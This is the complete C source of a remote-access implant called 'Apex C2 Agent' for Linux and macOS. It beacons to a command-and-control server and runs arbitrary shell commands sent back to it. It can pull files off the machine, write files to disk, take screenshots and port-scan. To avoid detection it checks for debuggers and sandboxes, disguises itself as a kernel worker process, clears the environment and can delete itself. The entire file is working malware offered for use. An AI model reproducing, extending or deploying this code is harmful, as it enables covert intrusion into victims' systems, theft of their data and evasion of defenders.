/*
 * Apex C2 Agent - POSIX implant (Linux + macOS)
 * Supports TLS/HTTPS via OpenSSL when USE_HTTPS=1.
 *
 * Linux:  gcc -O2 -s -o agent_linux agent_posix.c -lpthread [-lssl -lcrypto]
 * macOS:  clang -O2 -o agent_macos agent_posix.c -lpthread [-lssl -lcrypto]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <pwd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <ifaddrs.h>

#if USE_HTTPS
#include <openssl/ssl.h>
#include <openssl/err.h>

static SSL_CTX *g_ssl_ctx = NULL;

static void tls_init(void) {
    if (g_ssl_ctx) return;
#if OPENSSL_VERSION_NUMBER < 0x10100000L
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    g_ssl_ctx = SSL_CTX_new(SSLv23_client_method());
#else
    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
#endif
    if (g_ssl_ctx)
        SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
}

static ssize_t tls_send_wrapper(SSL *ssl, int sock, const void *buf, size_t len) {
    if (ssl) return (ssize_t)SSL_write(ssl, buf, (int)len);
    return send(sock, buf, len, 0);
}

static ssize_t tls_recv_wrapper(SSL *ssl, int sock, void *buf, size_t len) {
    if (ssl) return (ssize_t)SSL_read(ssl, buf, (int)len);
    return recv(sock, buf, len, 0);
}
#endif /* USE_HTTPS */

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8080
#endif
#ifndef USE_HTTPS
#define USE_HTTPS 0
#endif

/* Evasion toggles */
#ifndef ENABLE_ANTI_DEBUG
#define ENABLE_ANTI_DEBUG 1
#endif
#ifndef ENABLE_PROC_MASK
#define ENABLE_PROC_MASK 1
#endif
#ifndef ENABLE_SELF_DELETE
#define ENABLE_SELF_DELETE 0
#endif
#ifndef ENABLE_ENV_CLEAN
#define ENABLE_ENV_CLEAN 1
#endif
#ifndef ENABLE_SANDBOX_CHECK
#define ENABLE_SANDBOX_CHECK 1
#endif

#define BUF_SIZE 65536

/* Platform-specific evasion */
#ifdef __APPLE__
#include "evasion_macos.h"
#else
#include "evasion_linux.h"
#endif

#include "portscan.h"

/* ── Globals ─────────────────────────────────────────────── */

static int  g_sleep_ms   = 5000;
static int  g_jitter_pct = 20;
static char g_agent_id[128] = {0};
static int  g_argc = 0;
static char **g_argv = NULL;

/* ── System Info Helpers ─────────────────────────────────── */

static void get_hostname(char *buf, size_t len) {
    if (gethostname(buf, len) != 0)
        strncpy(buf, "unknown", len - 1);
    buf[len - 1] = '\0';
}

static void get_username(char *buf, size_t len) {
    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_name)
        strncpy(buf, pw->pw_name, len - 1);
    else
        strncpy(buf, "unknown", len - 1);
    buf[len - 1] = '\0';
}

static void get_internal_ip(char *buf, size_t len) {
    strncpy(buf, "0.0.0.0", len - 1);
    buf[len - 1] = '\0';
    struct ifaddrs *ifas, *ifa;
    if (getifaddrs(&ifas) != 0) return;
    for (ifa = ifas; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        if (strcmp(ifa->ifa_name, "lo") == 0 || strcmp(ifa->ifa_name, "lo0") == 0) continue;
        struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
        inet_ntop(AF_INET, &sa->sin_addr, buf, (socklen_t)len);
        break;
    }
    freeifaddrs(ifas);
}

static int get_pid(void) { return (int)getpid(); }

static void get_process_name(char *buf, size_t len) {
#ifdef __APPLE__
    uint32_t sz = (uint32_t)len;
    if (_NSGetExecutablePath(buf, &sz) != 0)
        strncpy(buf, "agent", len - 1);
#else
    ssize_t n = readlink("/proc/self/exe", buf, len - 1);
    if (n > 0) buf[n] = '\0';
    else strncpy(buf, "agent", len - 1);
#endif
    buf[len - 1] = '\0';
}

static const char *get_os_name(void) {
#ifdef __APPLE__
    return "macOS";
#else
    return "Linux";
#endif
}

static const char *get_arch(void) {
    struct utsname u;
    if (uname(&u) == 0) {
        if (strstr(u.machine, "x86_64") || strstr(u.machine, "amd64")) return "amd64";
        if (strstr(u.machine, "aarch64") || strstr(u.machine, "arm64")) return "arm64";
        if (strstr(u.machine, "arm")) return "arm";
    }
    return "amd64";
}

static int is_root(void) { return (geteuid() == 0); }

/* ── Base64 ──────────────────────────────────────────────── */

static void b64_encode(const unsigned char *in, size_t len, char *out) {
    static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i, j = 0;
    for (i = 0; i < len; i += 3) {
        unsigned long v = in[i] << 16;
        if (i+1 < len) v |= in[i+1] << 8;
        if (i+2 < len) v |= in[i+2];
        out[j++] = T[(v>>18)&0x3F]; out[j++] = T[(v>>12)&0x3F];
        out[j++] = (i+1 < len) ? T[(v>>6)&0x3F] : '=';
        out[j++] = (i+2 < len) ? T[v&0x3F] : '=';
    }
    out[j] = '\0';
}

static int b64_decode(const char *in, unsigned char *out, size_t out_len) {
    static const int D[256] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,['I']=8,['J']=9,
        ['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,['Q']=16,['R']=17,['S']=18,['T']=19,
        ['U']=20,['V']=21,['W']=22,['X']=23,['Y']=24,['Z']=25,
        ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,['i']=34,['j']=35,
        ['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,
        ['u']=46,['v']=47,['w']=48,['x']=49,['y']=50,['z']=51,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,
        ['8']=60,['9']=61,['+']=62,['/']=63
    };
    size_t slen = strlen(in), i, j = 0;
    for (i = 0; i < slen && in[i] != '=' && j < out_len; i += 4) {
        int a = D[(unsigned char)in[i]], b = (i+1<slen) ? D[(unsigned char)in[i+1]] : -1;
        if (b < 0) break;
        out[j++] = (unsigned char)((a<<2)|(b>>4));
        if (i+2<slen && in[i+2] != '=' && j < out_len) {
            int c = D[(unsigned char)in[i+2]]; out[j++] = (unsigned char)(((b&15)<<4)|(c>>2));
            if (i+3<slen && in[i+3] != '=' && j < out_len) {
                int d = D[(unsigned char)in[i+3]]; out[j++] = (unsigned char)(((c&3)<<6)|d);
            }
        }
    }
    return (int)j;
}

/* ── JSON helpers ────────────────────────────────────────── */

static void json_escape(const char *s, char *out, size_t out_len) {
    size_t j = 0;
    out[j++] = '"';
    while (*s && j < out_len - 4) {
        if (*s == '\\' || *s == '"') out[j++] = '\\';
        out[j++] = *s++;
    }
    out[j++] = '"'; out[j] = '\0';
}

static int json_get_string(const char *json, const char *key, char *out, size_t out_len) {
    const char *p = strstr(json, key);
    if (!p) return -1;
    p += strlen(key);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    if (*p != '"') return -1;
    p++;
    const char *end = strchr(p, '"');
    if (!end) return -1;
    size_t n = (size_t)(end - p);
    if (n >= out_len) n = out_len - 1;
    memcpy(out, p, n); out[n] = '\0';
    return 0;
}

/* ── HTTP POST over TCP socket (with optional TLS) ──────── */

static int http_post(const char *host, int port, int use_https, const char *path,
                     const char *body, size_t body_len, const char *agent_id,
                     char *resp, size_t resp_len)
{
    resp[0] = '\0';

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return -1; }

    struct timeval tv = { .tv_sec = 15, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, res->ai_addr, res->ai_addrlen) != 0) {
        close(sock); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);

#if USE_HTTPS
    SSL *ssl = NULL;
    if (use_https) {
        tls_init();
        if (!g_ssl_ctx) { close(sock); return -1; }
        ssl = SSL_new(g_ssl_ctx);
        SSL_set_fd(ssl, sock);
        SSL_set_tlsext_host_name(ssl, host);
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl); close(sock); return -1;
        }
    }
#define IO_SEND(buf, len) tls_send_wrapper(ssl, sock, buf, len)
#define IO_RECV(buf, len) tls_recv_wrapper(ssl, sock, buf, len)
#else
    (void)use_https;
#define IO_SEND(buf, len) send(sock, buf, len, 0)
#define IO_RECV(buf, len) recv(sock, buf, len, 0)
#endif

    /* Build HTTP request */
    char req[BUF_SIZE];
    int hdr_len;
    if (agent_id && agent_id[0])
        hdr_len = snprintf(req, sizeof(req),
            "POST %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/json\r\n"
            "X-Agent-ID: %s\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Content-Length: %zu\r\n"
            "Connection: close\r\n"
            "\r\n",
            path, host, port, agent_id, body_len);
    else
        hdr_len = snprintf(req, sizeof(req),
            "POST %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/json\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Content-Length: %zu\r\n"
            "Connection: close\r\n"
            "\r\n",
            path, host, port, body_len);

    if (IO_SEND(req, (size_t)hdr_len) < 0) goto io_fail;
    if (body_len > 0 && IO_SEND(body, body_len) < 0) goto io_fail;

    /* Read response */
    char raw[BUF_SIZE * 2];
    size_t total = 0;
    ssize_t n;
    while ((n = IO_RECV(raw + total, sizeof(raw) - total - 1)) > 0) {
        total += (size_t)n;
        if (total >= sizeof(raw) - 1) break;
    }
    raw[total] = '\0';

#if USE_HTTPS
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
#endif
    close(sock);
#undef IO_SEND
#undef IO_RECV

    /* Parse HTTP status */
    int status = 0;
    if (total > 12 && strncmp(raw, "HTTP/", 5) == 0) {
        const char *sp = strchr(raw, ' ');
        if (sp) status = atoi(sp + 1);
    }

    /* Extract body (after \r\n\r\n) */
    const char *body_start = strstr(raw, "\r\n\r\n");
    if (body_start) {
        body_start += 4;
        size_t blen = total - (size_t)(body_start - raw);
        if (blen >= resp_len) blen = resp_len - 1;
        memcpy(resp, body_start, blen);
        resp[blen] = '\0';
    }

    return (status >= 200 && status < 300) ? 0 : -1;

io_fail:
#if USE_HTTPS
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
#endif
    close(sock);
    return -1;
}

/* ── Command Execution (POSIX) ───────────────────────────── */

static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
    (void)out_b64_len;
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;

    pid_t pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return -1; }

    if (pid == 0) {
        /* Child */
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", cmd, (char*)NULL);
        _exit(127);
    }

    /* Parent */
    close(pipefd[1]);
    char raw[BUF_SIZE];
    size_t total = 0;
    ssize_t n;
    while ((n = read(pipefd[0], raw + total, sizeof(raw) - total - 1)) > 0) {
        total += (size_t)n;
        if (total >= sizeof(raw) - 1) break;
    }
    raw[total] = '\0';
    close(pipefd[0]);
    waitpid(pid, NULL, 0);

    while (total > 0 && (raw[total-1] == '\n' || raw[total-1] == '\r'))
        raw[--total] = '\0';

    b64_encode((unsigned char*)raw, total, out_b64);
    return 0;
}

/* ── Built-in Command Handlers ───────────────────────────── */

static void handle_sleep_cmd(const char *args, char *out_b64) {
    int sec = 0, jit = -1;
    if (args && args[0]) {
        sec = atoi(args);
        const char *sp = strchr(args, ' ');
        if (sp) jit = atoi(sp + 1);
    }
    if (sec > 0) g_sleep_ms = sec * 1000;
    if (jit >= 0 && jit <= 100) g_jitter_pct = jit;
    char msg[256];
    snprintf(msg, sizeof(msg), "Sleep set to %dms (jitter %d%%)", g_sleep_ms, g_jitter_pct);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

static void handle_whoami(char *out_b64) {
    char buf[512], user[128], host[128];
    get_username(user, sizeof(user));
    get_hostname(host, sizeof(host));
    snprintf(buf, sizeof(buf), "%s@%s%s", user, host, is_root() ? " [ROOT]" : "");
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

static void handle_getuid(char *out_b64) {
    char buf[256], user[128];
    get_username(user, sizeof(user));
    snprintf(buf, sizeof(buf), "uid=%d(%s) euid=%d root=%s pid=%d",
             getuid(), user, geteuid(), is_root() ? "Yes" : "No", get_pid());
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

static void handle_ps(char *out_b64) {
    /* Use /bin/ps for reliable cross-platform process listing */
    exec_cmd("ps aux 2>/dev/null || ps -ef 2>/dev/null", out_b64, BUF_SIZE);
}

static void handle_pwd(char *out_b64) {
    char buf[4096];
    if (getcwd(buf, sizeof(buf)))
        b64_encode((unsigned char*)buf, strlen(buf), out_b64);
    else
        b64_encode((unsigned char*)"unknown", 7, out_b64);
}

static void handle_cd(const char *path, char *out_b64) {
    if (chdir(path) == 0) {
        char buf[4096];
        if (getcwd(buf, sizeof(buf)))
            b64_encode((unsigned char*)buf, strlen(buf), out_b64);
        else
            b64_encode((unsigned char*)"changed", 7, out_b64);
    } else {
        char msg[256];
        snprintf(msg, sizeof(msg), "Failed to chdir: %s", strerror(errno));
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
    }
}

static void handle_download(const char *path, char *out_b64) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        char msg[256]; snprintf(msg, sizeof(msg), "Cannot open: %s", path);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64); return;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz > BUF_SIZE - 1) sz = BUF_SIZE - 1;
    char *buf = (char*)malloc((size_t)sz + 1);
    if (!buf) { fclose(f); b64_encode((unsigned char*)"out of memory", 13, out_b64); return; }
    size_t nread = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    b64_encode((unsigned char*)buf, nread, out_b64);
    free(buf);
}

/* Handle 'screenshot' - capture screen via available tools */
static void handle_screenshot_posix(char *out_b64, size_t out_cap) {
    const char *tmpfile = "/tmp/.apex_ss.bmp";
    const char *cmds[] = {
        "DISPLAY=:0 import -window root -resize 640 /tmp/.apex_ss.bmp 2>/dev/null",
        "DISPLAY=:0 scrot -o /tmp/.apex_ss.bmp 2>/dev/null",
        "DISPLAY=:0 xwd -root 2>/dev/null | convert xwd:- /tmp/.apex_ss.bmp 2>/dev/null",
#ifdef __APPLE__
        "screencapture -x /tmp/.apex_ss.bmp 2>/dev/null",
#endif
        NULL
    };

    int captured = 0;
    for (int i = 0; cmds[i]; i++) {
        if (system(cmds[i]) == 0) {
            struct stat st;
            if (stat(tmpfile, &st) == 0 && st.st_size > 0) {
                captured = 1;
                break;
            }
        }
    }

    if (!captured) {
        b64_encode((unsigned char*)"No screenshot tool available (install scrot or imagemagick)", 59, out_b64);
        return;
    }

    FILE *f = fopen(tmpfile, "rb");
    if (!f) {
        b64_encode((unsigned char*)"Failed to read screenshot file", 30, out_b64);
        return;
    }

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *data = (unsigned char *)malloc((size_t)sz);
    if (!data) { fclose(f); unlink(tmpfile); b64_encode((unsigned char*)"Out of memory", 13, out_b64); return; }
    size_t nread = fread(data, 1, (size_t)sz, f);
    fclose(f);
    unlink(tmpfile);

    size_t b64_needed = (nread + 2) / 3 * 4 + 1;
    if (b64_needed < out_cap)
        b64_encode(data, nread, out_b64);
    else
        b64_encode((unsigned char*)"Screenshot too large for buffer", 31, out_b64);

    free(data);
}

/* Handle 'upload' - write file to target disk.
   Decoded args format: "<remote_path>\n<base64_file_data>" */
static void handle_upload(const char *args, char *out_b64) {
    if (!args || !args[0]) {
        b64_encode((unsigned char*)"Usage: upload <remote_path> (data in args)", 43, out_b64);
        return;
    }
    const char *nl = strchr(args, '\n');
    if (!nl) {
        b64_encode((unsigned char*)"Invalid upload format: expected path\\ndata", 42, out_b64);
        return;
    }
    char path[4096];
    size_t plen = (size_t)(nl - args);
    if (plen >= sizeof(path)) plen = sizeof(path) - 1;
    memcpy(path, args, plen);
    path[plen] = '\0';

    const char *data_b64 = nl + 1;
    size_t alloc_sz = strlen(data_b64) + 1;
    if (alloc_sz < BUF_SIZE) alloc_sz = BUF_SIZE;
    unsigned char *file_data = (unsigned char *)malloc(alloc_sz);
    if (!file_data) {
        b64_encode((unsigned char*)"Out of memory", 13, out_b64);
        return;
    }
    int data_len = b64_decode(data_b64, file_data, alloc_sz);
    if (data_len <= 0) {
        free(file_data);
        b64_encode((unsigned char*)"Invalid file data", 17, out_b64);
        return;
    }

    FILE *f = fopen(path, "wb");
    if (!f) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Cannot create file: %s (%s)", path, strerror(errno));
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        free(file_data);
        return;
    }
    size_t written = fwrite(file_data, 1, (size_t)data_len, f);
    fclose(f);
    free(file_data);

    char msg[256];
    snprintf(msg, sizeof(msg), "Uploaded %zu bytes to %s", written, path);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

/* ── Multi-task JSON parser ─────────────────────────────── */

#define MAX_TASKS_PER_BEACON 16

typedef struct {
    char id[128];
    char command[256];
    char arguments_b64[BUF_SIZE];
} parsed_task;

static int parse_tasks(const char *resp, parsed_task *tasks, int max_tasks) {
    const char *arr = strstr(resp, "\"tasks\"");
    if (!arr) return 0;
    arr = strchr(arr, '[');
    if (!arr) return 0;

    int count = 0;
    const char *cursor = arr + 1;
    char obj[BUF_SIZE];

    while (count < max_tasks) {
        while (*cursor && *cursor != '{' && *cursor != ']') cursor++;
        if (*cursor != '{') break;

        const char *start = cursor;
        int depth = 0;
        do {
            if (*cursor == '"') {
                cursor++;
                while (*cursor && *cursor != '"') {
                    if (*cursor == '\\') cursor++;
                    cursor++;
                }
                if (*cursor) cursor++;
            } else {
                if (*cursor == '{') depth++;
                else if (*cursor == '}') depth--;
                cursor++;
            }
        } while (*cursor && depth > 0);

        size_t len = (size_t)(cursor - start);
        if (len >= sizeof(obj)) len = sizeof(obj) - 1;
        memcpy(obj, start, len);
        obj[len] = '\0';

        tasks[count].id[0] = '\0';
        tasks[count].command[0] = '\0';
        tasks[count].arguments_b64[0] = '\0';

        json_get_string(obj, "\"id\"", tasks[count].id, sizeof(tasks[count].id));
        json_get_string(obj, "\"command\"", tasks[count].command, sizeof(tasks[count].command));
        json_get_string(obj, "\"arguments\"", tasks[count].arguments_b64, sizeof(tasks[count].arguments_b64));

        if (tasks[count].id[0] && tasks[count].command[0])
            count++;
    }
    return count;
}

/* ── Beacon Loop ─────────────────────────────────────────── */

static void run_beacon(void) {
    const char *host = C2_HOST;
    const char *path = "/";
    int port = C2_PORT;
    int use_https = USE_HTTPS;

    /* Evasion at startup */
#if ENABLE_ENV_CLEAN
#ifdef __APPLE__
    clean_env_macos();
#else
    clean_ld_preload();
#endif
#endif

#if ENABLE_ANTI_DEBUG
#ifdef __APPLE__
    anti_debug_deny_attach();
    if (anti_debug_sysctl() != 0) _exit(0);
#else
    if (anti_debug_tracerpid() != 0) _exit(0);
#endif
#endif

#if ENABLE_SANDBOX_CHECK
#ifdef __APPLE__
    if (detect_sandbox_macos()) _exit(0);
#else
    if (detect_sandbox()) _exit(0);
#endif
#endif

#if ENABLE_PROC_MASK
#ifdef __APPLE__
    mask_cmdline_macos(g_argc, g_argv, "[kworker/u:0]");
#else
    mask_process_name("[kworker/u:0]");
    mask_cmdline(g_argc, g_argv, "[kworker/u:0]");
#endif
#endif

#if ENABLE_SELF_DELETE
#ifdef __APPLE__
    self_delete_macos();
#else
    self_delete();
#endif
#endif

    char hostname[64], username[64], internal_ip[64], process_name[4096];
    get_hostname(hostname, sizeof(hostname));
    get_username(username, sizeof(username));
    get_internal_ip(internal_ip, sizeof(internal_ip));
    get_process_name(process_name, sizeof(process_name));

    srand((unsigned)(time(NULL) ^ getpid()));

    char body[BUF_SIZE], resp[BUF_SIZE * 2];

    for (;;) {
        if (!g_agent_id[0]) {
            char he[128], ue[128], ie[128], pe[512];
            json_escape(hostname, he, sizeof(he));
            json_escape(username, ue, sizeof(ue));
            json_escape(internal_ip, ie, sizeof(ie));
            json_escape(process_name, pe, sizeof(pe));
            snprintf(body, sizeof(body),
                "{\"sysinfo\":{\"hostname\":%s,\"username\":%s,\"os\":\"%s\",\"arch\":\"%s\","
                "\"pid\":%d,\"process_name\":%s,\"internal_ip\":%s,\"sleep\":%d,\"jitter\":%d}}",
                he, ue, get_os_name(), get_arch(), get_pid(), pe, ie,
                g_sleep_ms / 1000, g_jitter_pct);
        } else {
            snprintf(body, sizeof(body), "{}");
        }

        if (http_post(host, port, use_https, path, body, strlen(body),
                      g_agent_id[0] ? g_agent_id : NULL, resp, sizeof(resp)) != 0)
            goto do_sleep;

        if (!g_agent_id[0]) {
            json_get_string(resp, "\"agent_id\"", g_agent_id, sizeof(g_agent_id));
            goto do_sleep;
        }

        /* Parse all pending tasks from response */
        parsed_task tasks[MAX_TASKS_PER_BEACON];
        int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_BEACON);
        if (task_count == 0) goto do_sleep;

        /* Allocate results buffer for all tasks */
        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256 + (4 * 1024 * 1024);
        char *results = (char *)malloc(results_cap);
        if (!results) goto do_sleep;
        size_t roff = 0;
        roff += (size_t)snprintf(results + roff, results_cap - roff, "{\"results\":[");
        int should_exit = 0;

        for (int t = 0; t < task_count; t++) {
            char args_decoded[BUF_SIZE];
            args_decoded[0] = '\0';
            if (tasks[t].arguments_b64[0]) {
                int alen = b64_decode(tasks[t].arguments_b64,
                                      (unsigned char*)args_decoded, sizeof(args_decoded)-1);
                if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
            }

            char out_b64[BUF_SIZE];
            out_b64[0] = '\0';
            int success = 1;

            if (strcmp(tasks[t].command, "sleep") == 0) {
                handle_sleep_cmd(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "whoami") == 0) {
                handle_whoami(out_b64);
            } else if (strcmp(tasks[t].command, "ps") == 0) {
                handle_ps(out_b64);
            } else if (strcmp(tasks[t].command, "pwd") == 0) {
                handle_pwd(out_b64);
            } else if (strcmp(tasks[t].command, "cd") == 0) {
                handle_cd(args_decoded[0] ? args_decoded : ".", out_b64);
            } else if (strcmp(tasks[t].command, "getuid") == 0 || strcmp(tasks[t].command, "id") == 0) {
                handle_getuid(out_b64);
            } else if (strcmp(tasks[t].command, "download") == 0) {
                handle_download(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "upload") == 0) {
                handle_upload(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "screenshot") == 0) {
                char *ss_buf = (char *)malloc(2 * 1024 * 1024);
                if (ss_buf) {
                    ss_buf[0] = '\0';
                    handle_screenshot_posix(ss_buf, 2 * 1024 * 1024);
                    if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
                    roff += (size_t)snprintf(results + roff, results_cap - roff,
                        "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}",
                        tasks[t].id, ss_buf);
                    free(ss_buf);
                    continue;
                }
                b64_encode((unsigned char*)"Out of memory for screenshot", 28, out_b64);
            } else if (strcmp(tasks[t].command, "portscan") == 0) {
                handle_portscan(args_decoded, out_b64, BUF_SIZE);
            } else if (strcmp(tasks[t].command, "exit") == 0) {
                b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                should_exit = 1;
            } else {
                char cmdline[4096] = "";
                if (strcmp(tasks[t].command, "exec") == 0 || strcmp(tasks[t].command, "shell") == 0) {
                    if (args_decoded[0]) strncpy(cmdline, args_decoded, sizeof(cmdline)-1);
                } else {
                    snprintf(cmdline, sizeof(cmdline), "%s%s%s",
                             tasks[t].command, args_decoded[0] ? " " : "", args_decoded);
                }
                if (cmdline[0]) {
                    success = (exec_cmd(cmdline, out_b64, sizeof(out_b64)) == 0);
                } else {
                    b64_encode((unsigned char*)"Empty command", 13, out_b64);
                    success = 0;
                }
            }

            if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
            roff += (size_t)snprintf(results + roff, results_cap - roff,
                "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}",
                tasks[t].id, out_b64, success ? "true" : "false");
        }

        roff += (size_t)snprintf(results + roff, results_cap - roff, "]}");
        http_post(host, port, use_https, path, results, roff, g_agent_id, resp, sizeof(resp));
        free(results);

        if (should_exit) _exit(0);

do_sleep:
        {
            int s = g_sleep_ms;
            if (g_jitter_pct > 0) {
                int j = (s * g_jitter_pct) / 100;
                if (j > 0) s += (rand() % (2*j+1)) - j;
            }
            if (s < 500) s = 500;

#ifdef __APPLE__
            encrypted_sleep_macos((unsigned int)s);
#else
            encrypted_sleep_linux((unsigned int)s);
#endif
        }
    }
}

/* ── Daemonize (background the process) ──────────────────── */

static void daemonize(void) {
    pid_t pid = fork();
    if (pid < 0) _exit(1);
    if (pid > 0) _exit(0); /* parent exits */
    setsid();
    signal(SIGHUP, SIG_IGN);
    /* Fork again to prevent terminal reacquisition */
    pid = fork();
    if (pid < 0) _exit(1);
    if (pid > 0) _exit(0);
    /* Redirect stdio to /dev/null */
    freopen("/dev/null", "r", stdin);
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
}

/* ── Entry Point ─────────────────────────────────────────── */

int main(int argc, char **argv) {
    g_argc = argc;
    g_argv = argv;

    /* Run as daemon unless --foreground flag is passed */
    int foreground = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--foreground") == 0 || strcmp(argv[i], "-f") == 0)
            foreground = 1;
    }
    if (!foreground) daemonize();

    run_beacon();
    return 0;
}
